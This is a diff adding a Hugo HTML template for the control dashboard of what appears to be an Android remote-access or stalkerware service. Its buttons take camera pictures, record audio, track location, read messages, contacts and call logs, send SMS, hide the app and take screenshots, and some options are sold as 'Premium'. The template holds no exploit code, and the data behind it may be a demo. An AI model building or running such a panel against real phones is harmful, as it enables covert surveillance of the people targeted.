@@ -1,0 +1,643 @@
+{{ $date := time.Now | time.Format "2006/1/02 3:04:00" }}
+
+
+<div class="row" style="height: auto !important;">
+    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 margin-top-10" style="height: auto !important; min-height: 0px !important;">
+        <div class="portlet light bordered margin-top-10 margin-bottom-10" style="height: auto !important;">
+            <div class="portlet-title">
+                <h2 class="caption h4">
+                    {{ with .Page.Params.pre }}<i class="{{.}} font-green"></i>{{ end }}
+                    <span class="caption-subject font-green sbold uppercase">{{.Page.Params.name}}</span>
+                </h2>
+            </div>
+            <div class="portlet-body" style="height: auto !important;">
+                <div class="tabbable-custom" style="height: auto !important;">
+                    <ul class="nav nav-tabs">
+                        <li class="active">
+                            <a href="#actions" data-toggle="tab" aria-expanded="true"><i class="fa fa-list font-red-thunderbird margin-right-10 bold"></i>Actions</a>
+                        </li>
+                        <li class="">
+                            <a href="#tabLogs" id="logsData" data-toggle="tab" aria-expanded="false"><i class="icon-doc font-red-thunderbird margin-right-10 bold"></i>Result</a>
+                        </li>
+                    </ul>
+                    <div class="tab-content" style="height: auto !important;">
+                        <div class="row" style="margin-left: 0px; margin-right: 0px; height: auto !important;">
+                            <div class="col-md-12 margin-top-10"></div>
+                        </div>
+                        <div class="tab-pane fade active in" id="actions" style="height: auto !important;">
+                            <div class="row margin-top-20">
+                                {{ range .Page.Params.get_location }}
+                                <div class="col-md-6">
+                                    <div class="portlet light bordered actionCard">
+                                        <div class="font-grey-cascade">
+                                            <i class="icon-map font-grey-cascade"></i>
+                                            <span>{{.name}}</span>
+                                        </div>
+                                        <div class="portlet-body form">
+                                            <div class="form-body">
+                                                <div class="form-group"></div>
+                                                {{ range .list_btn }}
+                                                <button class="btn btn-sm grey-cascade margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                {{ end }}
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                {{ end }} {{ range .Page.Params.recover_data }}
+                                <div class="col-md-6">
+                                    <div class="portlet light bordered actionCard">
+                                        <div class="font-blue">
+                                            <i class="icon-speech font-blue"></i>
+                                            <span>{{.name}}</span>
+                                        </div>
+                                        <div class="portlet-body form">
+                                            <div class="form-body">
+                                                <div class="form-group">
+                                                    <select id="numberDataByName" class="form-control input-medium margin-top-10">
+                                                        <option value="15">15</option>
+                                                        <option value="30">30</option>
+                                                        <option disabled="" value="30">60 (Premium)</option>
+                                                        <option disabled="" value="30">100 (Premium)</option>
+                                                        <option disabled="" value="30">250 (Premium)</option>
+                                                        <option disabled="" value="30">500 (Premium)</option>
+                                                        <option disabled="" value="30">1000 (Premium)</option>
+                                                        <option disabled="" value="30">5000 (Premium)</option>
+                                                        <option disabled="" value="30">10000 (Premium)</option>
+                                                    </select>
+                                                    <input class="form-control input-medium margin-top-10" type="tel" id="addressByName" placeholder="Example: 62814 943 748 - (Optional)" />
+                                                </div>
+                                                {{ range .list_btn }}
+                                                <button class="btn btn-sm blue margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                {{ end }}
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                {{ end }}
+                            </div>
+                            <div class="row">
+                                {{ range .Page.Params.take_pictures }}
+                                <div class="col-md-6">
+                                    <div class="portlet light bordered actionCard">
+                                        <div class="font-yellow-gold">
+                                            <i class="fa fa-camera font-yellow-gold"></i>
+                                            <span>{{.name}}</span>
+                                        </div>
+                                        <div class="portlet-body form">
+                                            <div class="form-body">
+                                                <div class="form-group">
+                                                    <div class="mt-radio-list">
+                                                        <label class="mt-radio mt-radio-outline">
+                                                            Front <input type="radio" value="1" name="radioTypeCamera" checked="" />
+                                                            <span></span>
+                                                        </label>
+                                                        <label class="mt-radio mt-radio-outline">
+                                                            Rear <input type="radio" value="0" name="radioTypeCamera" />
+                                                            <span></span>
+                                                        </label>
+                                                    </div>
+                                                    <label class="mt-checkbox mt-checkbox-outline"> <input type="checkbox" id="flashCheck" /> Use flash <span></span> </label>
+                                                </div>
+                                                {{ range .list_btn }}
+                                                <button class="btn btn-sm yellow-gold margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                {{ end }}
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                {{ end }} {{ range .Page.Params.take_record }}
+                                <div class="col-md-6">
+                                    <div class="portlet light bordered actionCard">
+                                        <div class="font-red-thunderbird">
+                                            <i class="fa fa-file-sound-o font-red-thunderbird"></i>
+                                            <span>{{.name}}</span>
+                                        </div>
+                                        <div class="portlet-body form">
+                                            <div class="form-body">
+                                                <div class="form-group">
+                                                    <select id="dataRecordAudio" class="form-control input-medium">
+                                                        <option value="1">1 minute</option>
+                                                        <option value="2">2 minutes</option>
+                                                        <option disabled="" value="1">3 minutes (Premium)</option>
+                                                        <option disabled="" value="1">4 minutes (Premium)</option>
+                                                        <option disabled="" value="1">5 minutes (Premium)</option>
+                                                        <option disabled="" value="1">6 minutes (Premium)</option>
+                                                        <option disabled="" value="1">7 minutes (Premium)</option>
+                                                        <option disabled="" value="1">8 minutes (Premium)</option>
+                                                        <option disabled="" value="1">9 minutes (Premium)</option>
+                                                        <option disabled="" value="1">10 minutes (Premium)</option>
+                                                        <option disabled="" value="1">15 minutes (Premium)</option>
+                                                        <option disabled="" value="1">20 minutes (Premium)</option>
+                                                    </select>
+                                                    <div class="mt-radio-list">
+                                                        <label class="mt-radio mt-radio-outline">
+                                                            MP3
+                                                            <input type="radio" value="1" name="radioTypeRecordAudio" checked="" />
+                                                            <span></span>
+                                                        </label>
+                                                        <label class="mt-radio mt-radio-outline">
+                                                            AMR
+                                                            <input type="radio" value="2" name="radioTypeRecordAudio" />
+                                                            <span></span>
+                                                        </label>
+                                                        <label class="mt-radio mt-radio-outline">
+                                                            WAV
+                                                            <input type="radio" value="3" name="radioTypeRecordAudio" />
+                                                            <span></span>
+                                                        </label>
+                                                    </div>
+                                                </div>
+                                                {{ range .list_btn }}
+                                                <button class="btn btn-sm red-thunderbird margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                {{ end }}
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                {{ end }}
+                            </div>
+                            <div class="row">
+                                {{ range .Page.Params.vibrate_ring }}
+                                <div class="col-md-6">
+                                    <div class="portlet light bordered actionCard">
+                                        <div class="font-purple-studio">
+                                            <i class="icon-magnet font-purple-studio"></i>
+                                            <span>{{.name}}</span>
+                                        </div>
+                                        <div class="portlet-body form">
+                                            <div class="form-body">
+                                                <div class="form-group">
+                                                    <input class="form-control input-medium" type="number" min="1" max="30" id="dataVibrate" placeholder="Tmme in seconds" value="5" />
+                                                </div>
+                                                {{ range .list_btn }}
+                                                <button class="btn btn-sm purple-studio margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                {{ end }}
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                {{ end }} {{ range .Page.Params.send_message }}
+                                <div class="col-md-6">
+                                    <div class="portlet light bordered actionCard">
+                                        <div class="font-blue-hoki">
+                                            <i class="fa fa-send font-blue-hoki"></i>
+                                            <span>{{.name}}</span>
+                                        </div>
+                                        <div class="portlet-body form">
+                                            <div class="form-body">
+                                                <div class="form-group">
+                                                    <input class="form-control input-medium margin-top-10" type="text" id="titreDialog" placeholder="Title" />
+                                                    <textarea class="form-control margin-top-10" type="text" id="messageDialog" placeholder="Message"></textarea>
+                                                    <label class="mt-checkbox mt-checkbox-outline margin-top-10"> <input type="checkbox" id="messageDialogCheckVoice" checked="checked" /> Message voice <span></span> </label>
+                                                </div>
+                                                {{ range .list_btn }}
+                                                <button class="btn btn-sm blue-hoki margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                {{ end }}
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                {{ end }}
+                            </div>
+                            <div class="row">
+                                {{ range .Page.Params.send_sms }}
+                                <div class="col-md-6">
+                                    <div class="portlet light bordered actionCard">
+                                        <div class="font-red-haze">
+                                            <i class="fa fa-send-o font-red-haze"></i>
+                                            <span>{{.name}}</span>
+                                        </div>
+                                        <div class="portlet-body form">
+                                            <div class="form-body">
+                                                <div class="form-group">
+                                                    <textarea class="form-control" type="text" id="messageSMS" placeholder="Message"></textarea>
+                                                    <input class="form-control input-medium margin-top-10" type="tel" id="numberSMS" placeholder="Number" />
+                                                </div>
+                                                {{ range .list_btn }}
+                                                <button class="btn btn-sm red-haze margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                {{ end }}
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                {{ end }} {{ range .Page.Params.retrieve_contact }}
+                                <div class="col-md-6">
+                                    <div class="portlet light bordered actionCard">
+                                        <div class="font-yellow-casablanca">
+                                            <i class="icon-notebook font-yellow-casablanca"></i>
+                                            <span>{{.name}}</span>
+                                        </div>
+                                        <div class="portlet-body form">
+                                            <div class="form-body">
+                                                <div class="form-group">
+                                                    {{ range .list_btn }}
+                                                    <button class="btn btn-sm yellow-casablanca margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                    {{ end }}
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                {{ end }}
+                            </div>
+                            <div class="row">
+                                {{ range .Page.Params.show_hide_app }}
+                                <div class="col-md-6">
+                                    <div class="portlet light bordered actionCard">
+                                        <div class="font-yellow-crusta">
+                                            <i class="fa fa-pencil-square-o font-yellow-crusta"></i>
+                                            <span>{{.name}}</span>
+                                        </div>
+                                        <div class="portlet-body form">
+                                            <div class="form-body">
+                                                <div class="form-group">
+                                                    {{ range .list_btn }}
+                                                    <button class="btn btn-sm yellow-crusta margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                    {{ end }}
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                {{ end }}
+                            </div>
+                            <div class="row">
+                                {{ range .Page.Params.sim_card_data }}
+                                <div class="col-md-6">
+                                    <div class="portlet light bordered actionCard">
+                                        <div class="font-red-sunglo">
+                                            <i class="fa fa-mobile-phone font-red-sunglo"></i>
+                                            <span>{{.name}}</span>
+                                        </div>
+                                        <div class="portlet-body form">
+                                            <div class="form-body">
+                                                <div class="form-group">
+                                                    {{ range .list_btn }}
+                                                    <button class="btn btn-sm red-sunglo margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                    {{ end }}
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                {{ end }} {{ range .Page.Params.screenshot_data }}
+                                <div class="col-md-6">
+                                    <div class="portlet light bordered actionCard">
+                                        <div class="font-green-dark">
+                                            <i class="fa fa-tv font-green-dark"></i>
+                                            <span>{{.name}}</span>
+                                        </div>
+                                        <div class="portlet-body form">
+                                            <div class="form-body">
+                                                <span style="color: #999b9b; font-size: 11px;">
+                                                    If the screenshot permission is disabled, a message will be displayed in the foreground to ask the user for permission to take screenshots of his phone.
+                                                </span>
+                                                <div class="form-group">
+                                                    {{ range .list_btn }}
+                                                    <button class="btn btn-sm green-dark margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                    {{ end }}
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                {{ end }}
+                            </div>
+                            <div class="row">
+                                {{ range .Page.Params.camera_data }}
+                                <div class="col-md-6">
+                                    <div class="portlet light bordered actionCard">
+                                        <div class="font-yellow-gold">
+                                            <i class="fa fa-camera font-yellow-gold"></i>
+                                            <span>{{.name}}</span>
+                                        </div>
+                                        <div class="portlet-body form">
+                                            <div class="form-body">
+                                                <div class="form-group">
+                                                    {{ range .list_btn }}
+                                                    <button class="btn btn-sm yellow-gold margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                    {{ end }}
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                {{ end }}
+                            </div>
+                            <hr />
+                            <button id="accesRoot" type="button" class="btn green"><i class="fa fa-caret-up"></i>Actions root access</button>
+                            <div id="blocRoot" style="">
+                                <hr />
+                                <div class="row">
+                                    {{ range .Page.Params.gps_network_data }}
+                                    <div class="col-md-6">
+                                        <div class="portlet light bordered actionCard">
+                                            <div class="font-blue-madison">
+                                                <i class="fa fa-location-arrow font-blue-madison"></i>
+                                                <span>{{.name}}</span>
+                                            </div>
+                                            <div class="portlet-body form">
+                                                <div class="form-body">
+                                                    <div class="form-group">
+                                                        {{ range .list_btn }}
+                                                        <button class="btn btn-sm blue-madison margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                        {{ end }}
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    {{ end }} {{ range .Page.Params.recover_data_2 }}
+                                    <div class="col-md-6">
+                                        <div class="portlet light bordered actionCard">
+                                            <div class="font-purple-intense">
+                                                <i class="fa i icon-eye font-purple-intense"></i>
+                                                <span>{{.name}}</span>
+                                            </div>
+                                            <div class="portlet-body form">
+                                                <div class="form-body">
+                                                    <div class="form-group">
+                                                        <select id="numberDataMessagerie" class="form-control">
+                                                            <option value="15">15</option>
+                                                            <option value="30">30</option>
+                                                            <option value="30">60 (Premium)</option>
+                                                            <option disabled="" value="30">100 (Premium)</option>
+                                                            <option disabled="" value="30">250 (Premium)</option>
+                                                            <option disabled="" value="30">500 (Premium)</option>
+                                                            <option disabled="" value="30">1000 (Premium)</option>
+                                                        </select>
+                                                    </div>
+                                                    {{ range .list_btn }}
+                                                    <button class="btn btn-sm purple-intense margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                    {{ end }}
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    {{ end }}
+                                </div>
+                                <div class="row">
+                                    {{ range .Page.Params.retrieve_call }}
+                                    <div class="col-md-4">
+                                        <div class="portlet light bordered actionCard">
+                                            <div class="font-red-haze">
+                                                <i class="fa fa-mobile-phone font-red-haze"></i>
+                                                <span>{{.name}}</span>
+                                            </div>
+                                            <div class="portlet-body form">
+                                                <div class="form-body">
+                                                    <div class="form-group">
+                                                        <select id="numberDataCalls" class="form-control">
+                                                            <option value="15">15</option>
+                                                            <option value="30">30</option>
+                                                            <option disabled="" value="30">60 (Premium)</option>
+                                                            <option disabled="" value="30">100 (Premium)</option>
+                                                            <option disabled="" value="30">250 (Premium)</option>
+                                                            <option disabled="" value="30">500 (Premium)</option>
+                                                            <option disabled="" value="30">1000 (Premium)</option>
+                                                        </select>
+                                                    </div>
+                                                    {{ range .list_btn }}
+                                                    <button class="btn btn-sm red-haze margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                    {{ end }}
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    {{ end }} {{ range .Page.Params.restart_phone_data }}
+                                    <div class="col-md-4">
+                                        <div class="portlet light bordered actionCard">
+                                            <div class="font-grey-mint">
+                                                <i class="fa fa-refresh font-grey-mint"></i>
+                                                <span>{{.name}}</span>
+                                            </div>
+                                            <div class="portlet-body form">
+                                                <div class="form-body">
+                                                    <div class="form-group">
+                                                        {{ range .list_btn }}
+                                                        <button class="btn btn-sm grey-mint margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                        {{ end }}
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    {{ end }} {{ range .Page.Params.screenshot_data_2 }}
+                                    <div class="col-md-4">
+                                        <div class="portlet light bordered actionCard">
+                                            <div class="font-green-dark">
+                                                <i class="fa fa-tv font-green-dark"></i>
+                                                <span>{{.name}}</span>
+                                            </div>
+                                            <div class="portlet-body form">
+                                                <div class="form-body">
+                                                    <div class="form-group">
+                                                        {{ range .list_btn }}
+                                                        <button class="btn btn-sm green-dark margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                        {{ end }}
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    {{ end }}
+                                </div>
+                                <div class="row">
+                                    {{ range .Page.Params.mobile_data }}
+                                    <div class="col-md-12">
+                                        <div class="portlet light bordered actionCard">
+                                            <div class="font-grey-cascade">
+                                                <i class="fa fa-mobile-phone font-grey-cascade"></i>
+                                                <span>{{.name}}</span>
+                                            </div>
+                                            <div class="portlet-body form">
+                                                <div class="form-body">
+                                                    <div class="form-group">
+                                                        {{ range .list_btn }}
+                                                        <button class="btn btn-sm grey-cascade margin-top-10 action info" id="{{ . | urlize}}" type="button" data-loading-text="Processing ...">{{.}}</button>
+                                                        {{ end }}
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    {{ end }}
+                                </div>
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="tabLogs">
+                            <div class="row">
+                                <div class="col-md-12">
+                                    <div class="table-responsive">
+                                <div id="tabData_wrapper" class="dataTables_wrapper">
+                                    <div class="clear"></div>
+                                    <div class="dataTables_length" id="tabData_length">
+                                        <label>
+                                            <select name="state" id="maxRows" class="form-control input-sm input-xsmall input-inline">
+                                                {{ if .Page.Params.showdata20 }}
+                                                <option value="15">15</option>
+                                                <option value="20">20</option>
+                                                <option value="50">50</option>
+                                                <option value="100">100</option>
+                                                <option value="150">150</option>
+                                                <option value="-1">All</option>
+                                                {{ else }}
+                                                <option value="5">5</option>
+                                                <option value="10">10</option>
+                                                <option value="20">20</option>
+                                                <option value="50">50</option>
+                                                <option value="100">100</option>
+                                                <option value="150">150</option>
+                                                <option value="-1">All</option>
+                                                {{ end }}
+                                            </select>
+                                        </label>
+                                    </div>
+                                    <div id="tabData_filter" class="dataTables_filter">
+                                        <label><input type="text" id="search_input_all" onkeyup="FilterkeyWord_all_table()" class="form-control input-sm input-small input-inline" placeholder="Search" /></label>
+                                    </div>
+                                    <table class="table table-striped table-bordered table-hover table-checkable order-column dataTable" id="table-id" width="100%" cellpadding="0" role="grid" aria-describedby="tabData_info" style="width: 100%;">
+                                        <thead>
+                                            <tr role="row">
+                                                <th width="5%" class="all center sorting_disabled"
+                                                    rowspan="1"
+                                                    colspan="1"
+                                                    aria-label=""
+                                                    style="width: 52px;">
+                                                    <label class="mt-checkbox mt-checkbox-single mt-checkbox-outline">
+                                                        <input type="checkbox" id="selectAll" />
+                                                        <span></span>
+                                                    </label>
+                                                </th>
+                                                {{ range .Page.Params.thead }}
+                                                <th width="10%" class="all center sorting" tabindex="0" aria-controls="tabData" rowspan="1" colspan="1" aria-label="Type: activate to sort column ascending" style="width: {{.width}}px;">{{.name}}</th>
+                                                {{ end }}
+                                            </tr>
+                                        </thead>
+
+                                        
+                                        <tbody id="myList">
+                                            {{ range $.Page.Params.tbody.data }}
+                                            <tr role="row" class="odd">
+                                                <td class="center">
+                                                    <label class="mt-checkbox mt-checkbox-single mt-checkbox-outline">
+                                                        <input type="checkbox" class="chk1" value="{{.name}}" />
+                                                        <span></span>
+                                                    </label>
+                                                </td>
+
+                                                {{ with .date }}
+                                                <td class="sorting_1">{{$date}}</td>
+                                                {{ end }}
+
+                                                {{ with .name}}
+                                                <td>{{.}}</td>
+                                                {{ end }}
+
+                                                {{ with .name}}
+                                                <td><span class="label label-sm label-info"> ✔ </span></td>
+                                                {{ end }}
+
+                                                
+
+                                                {{ $type := .type }}
+
+                                                {{ if eq $type "video" }}
+                                                    <td>                                                      
+                                                        <button class="btn btn-outline btn-xs {{.class}}" {{ printf `onClick="videoUrl('%s')"` .linkfile | safeHTMLAttr }} data-loading-text="Processing ..." data-toggle="modal" data-target="#modalmedia" value="{{.name}}">WATCH</button>
+                                                    </td>
+                                                {{ end }}
+
+                                                {{ if eq $type "image" }}
+                                                    <td>                                                      
+                                                        <button class="btn btn-outline btn-xs {{.class}}" {{ printf `onClick="imageUrl('%s')"` .linkfile | safeHTMLAttr }} data-loading-text="Processing ..." data-toggle="modal" data-target="#modalimage" value="{{.name}}">VIEW</button>
+                                                    </td>
+                                                {{ end }}
+
+                                              
+
+                                            {{ end }}
+
+                                        </tbody>
+                                    </table>
+
+                                    
+                                    <div class="margin-top-10 margin-bottom-10 center" style="margin-left:10px;">
+                                        <button class="btn btn-circle btn-icon-only btn-danger info" id="btnRemove" disabled="disabled"><i class="icon-trash"></i></button>
+                                    </div>
+
+
+                                    <div class="rows_count">Showing 1 to 3 of 3 entries</div>
+                                    <div class="dataTables_paginate paging_bootstrap_full_number" id="tabData_paginate">
+                                        <ul class="pagination" style="visibility: visible;">
+                                            <li class="prev disabled">
+                                                <a href="#" title="First"><i class="fa fa-angle-double-left"></i></a>
+                                            </li>
+                                            <li class="prev disabled">
+                                                <a href="#" title="Prev"><i class="fa fa-angle-left"></i></a>
+                                            </li>
+                                            <li class="active"><a href="#">1</a></li>
+                                            <li class="next disabled">
+                                                <a href="#" title="Next"><i class="fa fa-angle-right"></i></a>
+                                            </li>
+                                            <li class="next disabled">
+                                                <a href="#" title="Last"><i class="fa fa-angle-double-right"></i></a>
+                                            </li>
+                                        </ul>
+                                    </div>
+
+
+                                    
+                                </div>
+                            </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+<div id="modalimage" class="modal fade" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="modal-dialog modal-sm">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+                <strong class="modal-title"></strong>
+            </div>
+            <div class="modal-body text-center">
+                    <figure id="imageh">
+                      <img src="/default.png" alt="Trulli" style="width:100%">
+                    </figure>
+            </div>
+            <div class="modal-footer">
+                <button type="button" data-dismiss="modal" class="btn btn-primary closebtn">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="modalmedia" class="modal fade" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="modal-dialog modal-md">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+                <strong class="modal-title"></strong>
+            </div>
+            <div class="modal-body text-center">
+                    <video id="video" poster="https://i.sstatic.net/9my1K.png" controls="controls" preload="true">
+                      <source type="video/webm">
+                    </video>
+            </div>
+            <div class="modal-footer">
+                <button type="button" data-dismiss="modal" class="btn btn-primary closebtn">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
